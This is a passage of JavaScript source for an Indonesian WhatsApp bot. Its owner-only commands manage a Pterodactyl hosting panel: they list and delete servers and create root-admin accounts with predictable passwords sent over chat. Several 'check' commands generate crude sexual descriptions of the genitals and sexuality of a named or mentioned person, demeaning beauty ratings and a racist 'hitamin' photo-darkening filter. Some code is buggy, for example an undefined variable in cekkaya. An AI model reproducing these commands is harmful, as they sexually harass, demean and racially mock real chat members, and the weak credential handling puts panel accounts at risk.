                    })
                })
                let result = await f2.json()
                if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
                let server = result.attributes
                var orang
                if (m.isGroup) {
                    orang = m.sender
                    await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
                } else {
                    orang = m.chat
                }
                var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0, 2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0, 2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu + "%"}*
* ${global.domain}

*Syarat & Ketentuan :*
${global.teksPanel}
`
                await fs.writeFileSync("akunpanel.txt", teks)
                await sock.sendMessage(orang, { document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks }, { quoted: m })
                await fs.unlinkSync("./akunpanel.txt")
                delete global.panel
            }
                break

            case "listpanel": case "listp": case "listserver": {
                if (!isAn) return m.reply(mess.owner)
                if (!global.apikey) return m.reply("Apikey tidak ditemukan!\nPastikan di settings.js *global.apikey* sudah di isi!")
                let page = 1
                let allServers = []
                while (true) {
                    let res = await fetch(`${global.domain}/api/application/servers?page=${page}`, {
                        headers: {
                            Accept: "application/json",
                            "Content-Type": "application/json",
                            Authorization: `Bearer ${global.apikey}`
                        }
                    })

                    let data = await res.json()
                    if (!data.data || data.data.length === 0) break

                    allServers.push(...data.data)

                    if (!data.meta?.pagination || page >= data.meta.pagination.total_pages) break
                    page++
                }

                if (!allServers.length) return m.reply("Tidak ada server panel.")

                let teks = `*List all server panel*\n> #Total: *${allServers.length} server*\n\n`
                let no = 1

                for (let srv of allServers) {
                    let s = srv.attributes
                    let uuid = s.uuid.split("-")[0]
                    let status = "unknown"

                    try {
                        let res = await fetch(`${global.domain}/api/client/servers/${uuid}/resources`, {
                            headers: {
                                Accept: "application/json",
                                "Content-Type": "application/json",
                                Authorization: `Bearer ${global.capikey}`
                            }
                        })
                        let json = await res.json()
                        status = json.attributes?.current_state?.toUpperCase() || "unknown"
                    } catch (e) {
                        status = "unknown"
                    }

                    teks += `┣𖣠 ID Server : *${s.id}*\n`
                    teks += `┣𖣠 ID User : *${s.user}*\n`
                    teks += `┣𖣠 Nama : *${s.name}*\n`
                    teks += `┣𖣠 RAM : *${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"}*\n`
                    teks += `┣𖣠 Status : *${status}*\n\n`
                }
                return sock.sendMessage(m.chat, { text: teks }, { quoted: m })
            }
                break

            case "delpanel":
            case "delp": {
                if (!isAn) return m.reply(mess.owner)
                if (global.apikey.length < 1) return m.reply("Apikey tidak ditemukan!\nPastikan di settings.js *global.apikey* sudah di isi!")
                if (!args[0]) return m.reply(example(`id servernya\n\nuntuk melihat id server ketik *${prefix}listpanel*`))

                let f = await fetch(global.domain + "/api/application/servers?page=1", {
                    method: "GET",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: "Bearer " + global.apikey
                    }
                })
                let result = await f.json()
                let servers = result.data
                let deletedUserId = null
                let deletedServerName = null

                for (let server of servers) {
                    let s = server.attributes
                    if (args[0] == s.id.toString()) {
                        deletedUserId = s.user // <-- ambil user ID dari server
                        deletedServerName = s.name

                        // Hapus server
                        await fetch(global.domain + `/api/application/servers/${s.id}`, {
                            method: "DELETE",
                            headers: {
                                Accept: "application/json",
                                "Content-Type": "application/json",
                                Authorization: "Bearer " + global.apikey
                            }
                        })
                    }
                }
                if (!deletedUserId) return m.reply("*ID Server* Tidak Ditemukan")
                // Hapus user berdasarkan user ID
                await fetch(global.domain + `/api/application/users/${deletedUserId}`, {
                    method: "DELETE",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: "Bearer " + global.apikey
                    }
                })
                m.reply(`Berhasil Menghapus Akun Panel *${capital(deletedServerName)}* (Server & User)`)
            }
                break

            case "cadmin": case "cadp": {
                if (!isAn) return m.reply(mess.owner)
                if (!text) return m.reply(example("username"))
                let username = text.toLowerCase()
                let email = username + "@epic.com"
                let name = capital(args[0])
                let password = username + "001"
                let f = await fetch(global.domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username.toLowerCase(),
                        "first_name": name,
                        "last_name": "Admin",
                        "root_admin": true,
                        "language": "en",
                        "password": password
                    })
                })
                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
                let user = data.attributes
                var orang
                if (!m.isGroup) {
                    orang = m.sender
                    await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
                } else {
                    orang = m.chat
                }
                var teks = `*Yours admin panel 📦*
* *ID User :* ${user.id}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling Script
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* No rusuh`
                await sock.sendMessage(orang, {
                    text: teks,
                    contextInfo: { isForwarded: true }
                }, { quoted: m });
            }
                break

            case "cadmin2": {
                if (!isAn) return Reply(mess.owner)
                if (!text) return m.reply(example("username"))
                let username = text.toLowerCase()
                let email = username + "@gmail.com"
                let name = capital(args[0])
                let password = username + "001"
                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username.toLowerCase(),
                        "first_name": name,
                        "last_name": "Admin",
                        "root_admin": true,
                        "language": "en",
                        "password": password
                    })
                })
                let data = await f.json();
                if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
                let user = data.attributes
                var orang
                if (m.isGroup) {
                    orang = m.sender
                    await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
                } else {
                    orang = m.chat
                }
                var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
                await fs.writeFileSync("./akunpanel.txt", teks)
                await sock.sendMessage(orang, { document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks }, { quoted: m })
                await fs.unlinkSync("./akunpanel.txt")
            }
                break

            case "deladmin": case "deladp": {
                if (!isAn) return m.reply(mess.owner)
                if (!args[0]) return m.reply(example(`id nya\n\nuntuk melihat id admin ketik *${prefix}listadmin*`))
                let cek = await fetch(global.domain + "/api/application/users?page=1", {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apikey
                    }
                })
                let res2 = await cek.json();
                let users = res2.data;
                let getid = null
                let idadmin = null
                await users.forEach(async (e) => {
                    if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
                        getid = e.attributes.username
                        idadmin = e.attributes.id
                        let delusr = await fetch(global.domain + `/api/application/users/${idadmin}`, {
                            "method": "DELETE",
                            "headers": {
                                "Accept": "application/json",
                                "Content-Type": "application/json",
                                "Authorization": "Bearer " + global.apikey
                            }
                        })
                        let res = delusr.ok ? {
                            errors: null
                        } : await delusr.json()
                    }
                })
                if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
                m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
            }
                break

            case "listadmin": case "listadp": {
                if (!isAn) return m.reply(mess.owner)
                let cek = await fetch(global.domain + "/api/application/users?page=1", {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apikey
                    }
                })
                let res2 = await cek.json();
                let users = res2.data;
                if (users.length < 1) return m.reply("Tidak Ada Admin Panel")
                var teks = "*List all admin panel*\n\n"
                await users.forEach((i) => {
                    if (i.attributes.root_admin !== true) return
                    teks += ` ⚪ ID User : *${i.attributes.id}*
   📍 Nama : *${i.attributes.first_name}*\n\n`
                })
                m.reply(teks)
            }
                break

            case "hpsallserver": case "clearpanel": case "clearserver": {
                if (!isAn) return reply(mess.owner)
                await reply(`*Memproses penghapusan semua user & server panel ⚠️*`)
                try {
                    const headers = {
                        "Authorization": "Bearer " + global.apikey,
                        "Content-Type": "application/json",
                        "Accept": "application/json",
                    };

                    async function getUsers() {
                        try {
                            const res = await axios.get(`${global.domain}/api/application/users`, { headers });
                            return res.data.data;
                        } catch (error) {
                            reply(JSON.stringify(error.response?.data || error.message, null, 2))
                            return [];
                        }
                    }

                    async function getServers() {
                        try {
                            const res = await axios.get(`${global.domain}/api/application/servers`, { headers });
                            return res.data.data;
                        } catch (error) {
                            reply(JSON.stringify(error.response?.data || error.message, null, 2))
                            return [];
                        }
                    }
                    async function deleteServer(serverUUID) {
                        try {
                            await axios.delete(`${global.domain}/api/application/servers/${serverUUID}`, { headers });
                            console.log(`Server ${serverUUID} berhasil dihapus.`);
                        } catch (error) {
                            console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
                        }
                    }
                    async function deleteUser(userID) {
                        try {
                            await axios.delete(`${global.domain}/api/application/users/${userID}`, { headers });
                            console.log(`User ${userID} berhasil dihapus.`);
                        } catch (error) {
                            console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
                        }
                    }
                    async function deleteNonAdminUsersAndServers() {
                        const users = await getUsers();
                        const servers = await getServers();
                        let totalSrv = 0
                        for (const user of users) {
                            if (user.attributes.root_admin) {
                                console.log(`Lewati admin: ${user.attributes.username}`);
                                continue; // Lewati admin
                            }
                            const userID = user.attributes.id;
                            const userEmail = user.attributes.email;
                            console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);
                            // Cari server yang dimiliki user ini
                            const userServers = servers.filter(srv => srv.attributes.user === userID);
                            // Hapus semua server user ini
                            for (const server of userServers) {
                                await deleteServer(server.attributes.id);
                                totalSrv += 1
                            }
                            // Hapus user setelah semua servernya terhapus
                            await deleteUser(userID);
                        }
                        await reply(`*Finished Cleaning the Panel ✅*

- Total *${totalSrv}* (user & server) panel dihapus 

*⚠️ Server yang dihapus bukan admin panel*`)
                    }
                    // Jalankan fungsi
                    return deleteNonAdminUsersAndServers();
                } catch (err) {
                    return reply(`${JSON.stringify(err, null, 2)}`)
                }
            }
                break

            case "addserver": case "addsrv": {
                if (!isAn) return m.reply(mess.owner)
                if (!text) return m.reply(example(`id,nama,ram\nKetik: *${prefix}listpanel* untuk melihat id`));
                let [usr_id, nama, ramInput] = text.split(",");
                if (!usr_id || !nama || !ramInput) return m.reply(example(`id,nama,ram\nKetik: *${prefix}listpanel* untuk melihat id`));
                usr_id = usr_id.trim();
                nama = nama.trim();
                ramInput = ramInput.trim().toLowerCase();

                let ram, disknya, cpu;

                if (["unli", "unlimited"].includes(ramInput)) {
                    ram = disknya = cpu = 0;
                } else if (/^\d+gb$/.test(ramInput)) {
                    const gb = parseInt(ramInput.replace("gb", ""));
                    if (gb < 1 || gb > 10) return reply("RAM hanya boleh dari 1GB sampai 10GB atau 'unli'");
                    ram = gb * 1000;
                    disknya = gb * 1000;
                    cpu = 20 + (gb * 20); // contoh: 1gb = 40%, 2gb = 60%, dst
                } else {
                    return reply("Format RAM salah. Gunakan seperti: 1gb - unli");
                }

                const desc = tanggal(Date.now());

                const getEgg = await fetch(`${global.domain}/api/application/nests/${nestid}/eggs/${egg}`, {
                    method: "GET",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: `Bearer ${global.apikey}`
                    }
                });

                const eggData = await getEgg.json();
                const startup_cmd = eggData.attributes.startup;

                const createServer = await fetch(`${global.domain}/api/application/servers`, {
                    method: "POST",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: `Bearer ${global.apikey}`
                    },
                    body: JSON.stringify({
                        name: nama,
                        description: desc,
                        user: parseInt(usr_id),
                        egg: parseInt(egg),
                        docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                        startup: startup_cmd,
                        environment: {
                            INST: "npm", USER_UPLOAD: "0",
                            AUTO_UPDATE: "0", CMD_RUN: "npm start"
                        },
                        limits: {
                            memory: parseInt(ram),
                            swap: 0,
                            disk: parseInt(disknya),
                            io: 500,
                            cpu: parseInt(cpu)
                        },
                        feature_limits: { databases: 5, backups: 5, allocations: 5 },
                        deploy: {
                            locations: [parseInt(loc)],
                            dedicated_ip: false,
                            port_range: [],
                        },
                    })
                });

                const result = await createServer.json();

                if (result.errors) return reply("Gagal menambah server:\n" + JSON.stringify(result.errors[0], null, 2));
                const server = result.attributes;

                let teks = `*Succes Create New Server ✅*
- User ID : ${usr_id}
- Server ID : ${server.id}
- Nama Server : ${nama}

*Server Specifications 🖥️*
- Ram : ${ram == 0 ? "Unlimited" : `${ram / 1000}GB`}
- Disk : ${disknya == 0 ? "Unlimited" : `${disknya / 1000}GB`}
- CPU : ${cpu == 0 ? "Unlimited" : cpu + "%"}`;

                await sock.sendMessage(m.chat, { text: teks, contextInfo: { isForwarded: true } }, { quoted: m });
            }
                break;
            case "cekkaya": {

                if (!text) return m.reply(example("nama"))
                let who = m.mentionedJid[0]
                    ? m.mentionedJid[0]
                    : m.quoted
                        ? m.quoted.sender
                        : m.sender;
                let kayaList = [
                    "*kekayaan : lu mah kismin*",
                    "*kekayaan : berduit dikit*",
                    "*kekayaan : kere 7 turunan*",
                    "*kekayaan : sekaya raffi ahmad*",
                    "*kekayaan : crazy rich😱*",
                    "*kekayaan : miskin*",
                    "*kekayaan : lumayan kaya*",
                    "*kekayaan : punya mobil 1*",
                    "*kekayaan : kaya tapi jelek*",
                    "*kekayaan : udah jelek miskin*",
                    "*kekayaan : yang kaya ortunya anaknya kismin*",
                    "*kekayaan : sederhana*",
                ];
                let pickRandom = (list) => list[Math.floor(Math.random() * list.length)];
                let khodam = pickRandom(kayaList);
                let name = await getName(sock, m.sender)

                m.reply(`*Hasil Pencarian Kekayaan*\n-------------------------------------------\n- *nama : ${text}*\n- ${kaya}\n\n> kalo mau kaya kerja ya anj, jangan main hp mulu`, { mentions: [who] });
            }
                break;

            case 'tekateki': {

                const soalList = [
                    { soal: "Aku punya leher tapi tidak punya kepala. Siapakah aku?", jawaban: "baju" },
                    { soal: "Makin malam makin terang, aku apa?", jawaban: "bulan" },
                    { soal: "Aku bisa menghilang saat kau sebut namaku. Siapa aku?", jawaban: "hening" },
                    { soal: "Apa yang bisa naik tapi tidak turun?", jawaban: "umur" },
                    { soal: "Apa yang selalu datang tapi tak pernah tiba?", jawaban: "besok" },
                    { soal: "Aku punya kaki tapi tidak bisa berjalan. Apakah aku?", jawaban: "meja" },
                    { soal: "Apa yang selalu basah saat mengeringkan?", jawaban: "handuk" },
                    { soal: "Benda apa yang dilempar malah kembali?", jawaban: "boomerang" },
                    { soal: "Benda apa yang kalau dipakai tetap dingin?", jawaban: "kipas" },
                    { soal: "Kenapa ayam menyeberang jalan?", jawaban: "karena ingin ke seberang" },
                    { soal: "Apa yang bulat, kecil, tapi bikin orang pusing?", jawaban: "utang" },
                    { soal: "Apa yang bisa dilihat tapi tidak bisa disentuh?", jawaban: "bayangan" },
                    { soal: "Semakin banyak diambil, semakin besar. Apakah aku?", jawaban: "lubang" },
                    { soal: "Aku selalu bersama kamu tapi kamu gak bisa pegang aku. Apa aku?", jawaban: "bayangan" },
                    { soal: "Aku bisa terbang tanpa sayap dan bisa jatuh tanpa terluka. Apa aku?", jawaban: "waktu" },
                    { soal: "Apa yang bisa memanjat tapi tidak punya kaki?", jawaban: "suara" },
                    { soal: "Semua orang punya tapi tak bisa dilihat. Apakah aku?", jawaban: "pikiran" },
                    { soal: "Benda apa yang tiap hari dibuka tutup tapi tidak marah?", jawaban: "pintu" },
                    { soal: "Apa yang bisa masuk rumah tanpa izin?", jawaban: "udara" },
                    { soal: "Apa yang gak bisa dilihat tapi bisa dirasakan?", jawaban: "angin" },
                    { soal: "Apa yang selalu kamu bawa tapi gak pernah kamu lihat?", jawaban: "punggung" },
                    { soal: "Aku bisa nyala tanpa api. Aku apa?", jawaban: "lampu" },
                    { soal: "Apa yang kalau berdiri dia miring, tapi kalau tidur dia lurus?", jawaban: "pensil" },
                    { soal: "Apa yang warnanya putih tapi bukan kapas?", jawaban: "awan" },
                    { soal: "Aku lahir dari api, tapi aku basah. Siapakah aku?", jawaban: "abu" },
                    { soal: "Apa yang bisa berputar tapi tidak jalan?", jawaban: "kipas angin" },
                    { soal: "Apa yang kalau disimpan dia hilang?", jawaban: "rahasia" },
                    { soal: "Apa yang bisa mengikat tapi tidak kelihatan?", jawaban: "janji" },
                    { soal: "Aku selalu di belakang kamu, tapi kamu gak bisa lihat aku. Apa aku?", jawaban: "masa lalu" },
                    { soal: "Apa yang selalu benar tapi jarang dipercaya?", jawaban: "logika" },
                    { soal: "Aku punya tangan tapi gak punya jari. Siapa aku?", jawaban: "jam" }
                ];
                let soalAcak = soalList[Math.floor(Math.random() * soalList.length)];
                global.tekatekiJawaban = soalAcak.jawaban.toLowerCase();

                m.reply(`❓ *Teka-Teki Waktu Santai!*\n\n*Soal:* ${soalAcak.soal}\n\nKetik *.jawabteka [jawaban kamu]*`);
            }
                break;

            case 'jawabteka': {

                if (!global.tekatekiJawaban) return m.reply("⚠️ Belum ada teka-teki yang aktif. Ketik *.tekateki* dulu!");

                const jawabanUser = text.toLowerCase().trim();
                if (jawabanUser === global.tekatekiJawaban) {
                    m.reply("✅ *Bener cuy!* Pinter juga kepala lu!");
                } else {
                    m.reply(`❌ *Salah!*\nClue: Jawabannya ${global.tekatekiJawaban.length} huruf.`);
                }
            }
                break;

            case 'cekfemboy': {

                if (!text) return m.reply('Masukin nama dulu, biar bisa gue nilai... seberapa layak lo dibisik "malam ini kamu punyaku ya~".');

                let target = text || m.pushName;

                const hash = Array.from(target).reduce((acc, char) => acc + char.charCodeAt(0), 0);
                const percent = Math.floor((hash * Date.now()) % 101);

                let rank = '';
                if (percent >= 95) {
                    rank = 'UKE LEGENDARIS';
                } else if (percent >= 85) {
                    rank = 'FEMBOY HOTLINE';
                } else if (percent >= 70) {
                    rank = 'FEMBOY SIAGA 1';
                } else if (percent >= 50) {
                    rank = 'FEMBOY NGEFLIRT';
                } else if (percent >= 30) {
                    rank = 'FEMBOY TERPENDAM';
                } else {
                    rank = 'TARGET FANTASI';
                }

                let komentar = '';
                if (percent >= 95) {
                    komentar = 'Lo tuh femboy idaman sugar daddy. Dikit aja dikasih perhatian, langsung manja-manja sambil meringkuk di dada orang. Suara lo? ASMR-nya ngegoda setengah mati.';
                } else if (percent >= 85) {
                    komentar = 'Dari cara lo ngetik aja udah kebaca: lo suka dipeluk dari belakang sambil dibisikin pelan. "Udah siap buat nakal belum?" dan lo cuma bisa ngangguk pelan.';
                } else if (percent >= 70) {
                    komentar = 'Lo bukan cuma femboy... lo tuh pemicu dosa. Outfit lo selalu kebetulan *nempel banget*. Bikin yang lihat pengen langsung tarik dan bilang "ayo, kamar kosong ada nih."';
                } else if (percent >= 50) {
                    komentar = 'Lo diem-diem horny. Di luar keliatan kalem, tapi pas malem sendirian, lo buka headset, pasang playlist "moan compilation", dan... ya, lo ngerti sendiri lanjutannya.';
                } else if (percent >= 30) {
                    komentar = 'Aura lo tuh "aku malu, tapi mau". Sering banget dikira polos, padahal tab bookmark lo isinya *doujin* dan video-videonya full dengan tag yang... gak bisa dijelasin di sini.';
                } else {
                    komentar = 'Lo bukan femboy. Tapi lo punya muka yang sering jadi thumbnail video "cowok straight dibikin leleh sama trap". Dan lo nonton... sampe habis. Diam-diam ngulang 3x.';
                }

                const notes = [
                    'Note: Stop nyari "femboy gets bred" di search bar, lo ketauan.',
                    'Note: Lo tuh bukan innocent, lo cuman belum ke-ekspos aja.',
                    'Note: Lo suka bilang "iya kak..." pas voice? Jangan sok malu deh.',
                    'Note: History lo isinya lebih orno dari VPN premium.',
                    'Note: Lo udah bukan wibu biasa, lo tuh femboy enjoyer tingkat advance.',
                    'Note: Kalau explore IG lo isinya cowok berseragam ketat... lo udah tau lah.',
                ];

                const pickNote = notes[Math.floor(Math.random() * notes.length)];

                m.reply(`👤 *${target}*\n🏅 *RANK:* ${rank}\n🔞 *${percent}% Femboy Power*\n\n${komentar}\n\n${pickNote}`);
            }
                break


            case "cekkontol": {

                if (!text) return m.reply(example("nama nya mana pea"))

                let who = m.mentionedJid[0]
                    ? m.mentionedJid[0]
                    : m.quoted
                        ? m.quoted.sender
                        : m.sender;

                // data random
                let warnaList = ["hitam", "coklat", "pink", "abu-abu", "merah", "orange,", "kuning", "biru", "titanium"]
                let ukuranList = ["kecil", "sedang", "besar", "sangat kecil", " sangat besar", "oversize"]
                let kondisiList = ["belom sunat", "sudah sunat", " hitam berdaki", "miring kesamping", " biji nya ga simetris ", "ga bisa ngaceng"]

                let pickRandom = (list) => list[Math.floor(Math.random() * list.length)]

                let name = await getName(sock, m.sender)
                let warna = pickRandom(warnaList)
                let ukuran = pickRandom(ukuranList)
                let kondisi = pickRandom(kondisiList)

                m.reply(
                    `*Hasil Pengecekan Kontol*
-------------------------------------------
- *Nama*    : ${text}
- *Warna*   : ${warna}
- *Ukuran*  : ${ukuran}
- *Kondisi* : ${kondisi}

> © @VannessWangsaff`,
                    { mentions: [who] }
                )
            }
                break


            case "cekmemek": {

                if (!text) return m.reply(example("namanya mana pea"))

                let who = m.mentionedJid[0]
                    ? m.mentionedJid[0]
                    : m.quoted
                        ? m.quoted.sender
                        : m.sender;

                // data random
                let warnaList = ["pink", "merah muda", "kehitaman", "putih", "kuning", "hijau muda", " biru muda"]
                let ukuranList = ["sempit", "sedang", "lebar", "oversize", "sangat lebar", "sangat sempit"]
                let kondisiList = ["masih fresh", "sudah berpengalaman", "perawan", "butuh perhatian", "udah longgar", "berkurap", "berjamur"]

                let pickRandom = (list) => list[Math.floor(Math.random() * list.length)]

                let name = await getName(sock, m.sender)
                let warna = pickRandom(warnaList)
                let ukuran = pickRandom(ukuranList)
                let kondisi = pickRandom(kondisiList)

                m.reply(
                    `*Hasil Pengecekan Meki*
-------------------------------------------
- *Nama*    : ${text}
- *Warna*   : ${warna}
- *Ukuran*  : ${ukuran}
- *Kondisi* : ${kondisi}

> © @VannessWangsaff`,
                    { mentions: [who] }
                )
            }
                break


            case "cantikcek":
            case "cekcantik": {
                let who = m.mentionedJid[0]
                    ? m.mentionedJid[0]
                    : m.quoted
                        ? m.quoted.sender
                        : m.sender

                let name = await getName(sock, who)

                let cantikk = [
                    'Cantik Level : 4%\n\nINI MUKA ATAU SAMPAH?!',
                    'Cantik Level : 7%\n\nSerius ya,, lu mirip monyet kelaperan',
                    'Cantik Level : 12%\n\nMuka lu bikin orang batal makan',
                    'Cantik Level : 22%\n\nDosa lu numpuk sampe nutup aura 😭',
                    'Cantik Level : 27%\n\nJodoh? Kayaknya lagi libur',
                    'Cantik Level : 35%\n\nYang sabar ya, masih proses',
                    'Cantik Level : 41%\n\nMinimal niat dulu buat cantik',
                    'Cantik Level : 48%\n\nCowok liat lu auto logout',
                    'Cantik Level : 56%\n\nSetengah cantik, setengah bikin trauma',
                    'Cantik Level : 64%\n\nUdah mendingan lah dikit',
                    'Cantik Level : 71%\n\nLumayan, ga bikin kaget',
                    'Cantik Level : 2%\n\nAWOAKAK BURIQQQ PARAH!!!',
                    'Cantik Level : 1%\n\nINI MAH ERROR MUKA 😭',
                    'Cantik Level : 77%\n\nMulai aman, ga bikin orang kabur',
                    'Cantik Level : 83%\n\nCowok ga bakal nyesel ngeliat lu',
                    'Cantik Level : 89%\n\nAuto jadi pusat perhatian',
                    'Cantik Level : 94%\n\nBAHAYA INI CANTIKNYA',
                    'Cantik Level : 100%\n\nFix bidadari nyasar 😳'
                ]

                let hasil = cantikk[Math.floor(Math.random() * cantikk.length)]

                await sock.sendMessage(m.chat, { react: { text: "💄", key: m.key } })

                m.reply(
                    `💅 *CEK KECANTIKAN*\n\n` +
                    `👤 *Nama:* @${who.split("@")[0]}\n\n` +
                    `${hasil}\n\n` +
                    `> © @VannessWangsaff`,
                    { mentions: [who] }
                )
            }
                break



            case "hitamin": {
                try {
                    const quoted = m.quoted ? m.quoted : m
                    const mime = quoted.mimetype || ""

                    if (!/image/.test(mime))
                        return m.reply("❌ Reply gambar dengan caption *hitamin*")

                    await sock.sendMessage(m.chat, { react: { text: "🧭", key: m.key } })

                    const mediaPath = await sock.downloadAndSaveMediaMessage(quoted)
                    const buffer = fs.readFileSync(mediaPath)
                    const base64Image = buffer.toString("base64")

                    const response = await axios.post(
                        "https://negro.consulting/api/process-image",
                        {
                            filter: "hitam",
                            imageData: "data:image/png;base64," + base64Image
                        },
                        {
                            headers: {
                                "Content-Type": "application/json"
                            }
                        }
                    )

                    const resultBuffer = Buffer.from(
                        response.data.processedImageUrl.replace(
                            /^data:image\/png;base64,/,
                            ""
                        ),
                        "base64"
                    )

                    await sock.sendMessage(
                        m.chat,
                        {
                            image: resultBuffer,
                            caption: "✅ Selesai, filter *HITAM* berhasil diterapkan"
                        },
                        { quoted: m }
                    )

                    fs.unlinkSync(mediaPath)
                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

                } catch (err) {
                    console.error(err)
                    m.reply("❌ Gagal memproses gambar")
                }
            }
                break




            case 'playch':
            case 'playchannel': {
                if (!isAn) return m.reply(mess.owner)
                if (!text) return m.reply(`Contoh:\n${prefix}${command} judul lagu`)
                if (!global.idCh) return m.reply('❌ ID channel belum diset di settings.js')

                try {
                    m.reply('🎧 Memproses lagu, mohon tunggu...')

                    const api = `https://api.elrayyxml.web.id/api/downloader/ytplay?q=${encodeURIComponent(text)}`
                    const { data } = await axios.get(api)

                    if (!data?.result) return m.reply('❌ Lagu tidak ditemukan.')

                    const {
                        title,
                        thumbnail,
                        download_url,
                        url: youtubeUrl
                    } = data.result


                    const audioRes = await axios.get(download_url, {
                        responseType: 'arraybuffer',
                        headers: { 'User-Agent': 'Mozilla/5.0' }
                    })

                    const tempIn = path.join(os.tmpdir(), `${Date.now()}_in.mp3`)
                    const tempOut = path.join(os.tmpdir(), `${Date.now()}_out.opus`)
                    fs.writeFileSync(tempIn, Buffer.from(audioRes.data))


                    await new Promise((resolve, reject) => {
                        exec(
                            `ffmpeg -y -i "${tempIn}" -c:a libopus -b:a 128k "${tempOut}"`,
                            err => err ? reject(err) : resolve()
                        )
                    })


                    let thumbBuffer = null
                    if (thumbnail) {
                        try {
                            const thumb = await axios.get(thumbnail, {
                                responseType: 'arraybuffer',
                                timeout: 10000
                            })
                            thumbBuffer = Buffer.from(thumb.data)
                        } catch { }
                    }

                    const newsletterInfo = {
                        newsletterJid: global.idCh,
                        serverMessageId: 100,
                        newsletterName: global.namaBot
                    }

                    await sock.sendMessage(global.idCh, {
                        audio: fs.readFileSync(tempOut),
                        mimetype: 'audio/ogg; codecs=opus',
                        ptt: true,
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: newsletterInfo,
                            externalAdReply: {
                                title: title.slice(0, 60),
                                body: global.namaBot,
                                thumbnail: thumbBuffer,
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                sourceUrl: youtubeUrl,
                                mediaUrl: youtubeUrl,
                                showAdAttribution: false
                            }
                        }
                    })

                    fs.unlinkSync(tempIn)
                    fs.unlinkSync(tempOut)

                    m.reply(`✅ Lagu berhasil dikirim ke channel\n🎵 *${title}*`)
                } catch (e) {
                    console.error(e)
                    m.reply('❌ Terjadi kesalahan saat memproses lagu.')
                }
            }
                break



                function formatNumber(n) {
                    return Number(n || 0).toLocaleString("id-ID");
                }

                function formatDuration(sec) {
                    if (!sec) return "00:00";
                    const m = Math.floor(sec / 60).toString().padStart(2, "0");
                    const s = Math.floor(sec % 60).toString().padStart(2, "0");
                    return `${m}:${s}`;
                }


            case "tiktok":
            case "tt":
            case "ttsearch": {

                db.checkAndResetLimit(m.sender, isAn, isPrem);

                // 2. Validasi Sisa Limit (Owner tidak terkena validasi ini)
                if (!isAn && !db.hasLimit(m.sender)) {
                    let txtLimit = `❌ *ACCESS DITOLAK!*\n\n`;
                    txtLimit += `Limit harian kamu sudah habis!\n`;
                    txtLimit += `Tunggu besok hari untuk reset otomatis, atau upgrade ke *Premium* untuk limit tanpa batas.\n`;
                    txtLimit += `> Ketik *${prefix}owner* untuk info Premium.`;

                    return reply(txtLimit);
                }



                try {
                    const input = m.quoted?.text || text;
                    if (!input)
                        return m.reply(`*TIKTOK DOWNLOADER & TIKTOK SEARCH*

• Download:
  ${prefix + command} mana link nya dongo

• Search:
  ${prefix + command} Mukbang Sapi thailand
`);

                    await sock.sendMessage(m.chat, { react: { text: '🧭', key: m.key } })
                    const regex = /(https:\/\/(vt|vm)\.tiktok\.com\/[^\s]+|https:\/\/www\.tiktok\.com\/@[\w.-]+\/video\/\d+)/;
                    const url = input.match(regex)?.[0];

                    if (url) {
                        const res = await fetch(`https://www.tikwm.com/api/?url=${url}&hd=1`);
                        const json = await res.json();
                        if (!json?.data) return m.reply("❌ Gagal mengambil data TikTok");

                        await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })

                        const d = json.data;

